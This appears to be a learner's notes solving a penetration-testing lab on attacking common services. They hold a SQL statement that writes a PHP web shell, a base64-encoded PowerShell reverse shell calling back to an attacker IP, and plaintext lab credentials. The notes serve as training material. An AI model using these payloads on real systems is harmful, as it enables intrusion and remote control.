# Attacking common services

## Easy

SMTP fiona@inlanefreight.htb 987654321

FTP fiona 987654321



```
mariadb -h «IP» -u fiona -p987654321
```

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

```
https://«IP»/backdoor.php/?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADkAIgAsADgAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

## Medium

PORT STATE SERVICE REASON&#x20;

22/tcp open ssh syn-ack ttl 63&#x20;

53/tcp open domain syn-ack ttl 63&#x20;

110/tcp open pop3 syn-ack ttl 63&#x20;

995/tcp open pop3s syn-ack ttl 63&#x20;

2121/tcp open ccproxy-ftp syn-ack ttl 63&#x20;

30021/tcp open unknown syn-ack ttl 63

```
ftp «IP» 30021
anonymous
```

SSH simon password: 8Ns8j1b!23hs4921smHzwn

## HARD

PORT STATE SERVICE REASON&#x20;

135/tcp open msrpc syn-ack ttl 127&#x20;

445/tcp open microsoft-ds syn-ack ttl 127&#x20;

1433/tcp open ms-sql-s syn-ack ttl 127&#x20;

3389/tcp open ms-wbt-server syn-ack ttl 127

### fiona 48Ns72!bns74@S84NNNSl  RDP

#### information.txt

Windows Creds

kAkd03SA@#!&#x20;

48Ns72!bns74@S84NNNSl&#x20;

SecurePassword!&#x20;

Password123!&#x20;

SecureLocationforPasswordsd123!!

### john&#x20;

To do:

* Keep testing with the database.
* Create a local linked server.

#### secrets.txt

Password Lists:

1234567&#x20;

(DK02ka-dsaldS&#x20;

Inlanefreight2022&#x20;

Inlanefreight2022!&#x20;

TestingDB123

### simon

#### random.txt

Credentials

(k20ASD10934kadA&#x20;

KDIlalsa9020$&#x20;

JT9ads02lasSA@&#x20;

Kaksd032klasdA#





MSSQL&#x20;

```
mssqlclient.py -p 1433 WIN-HARD/fiona@10.129.91.176 -windows-auth
```





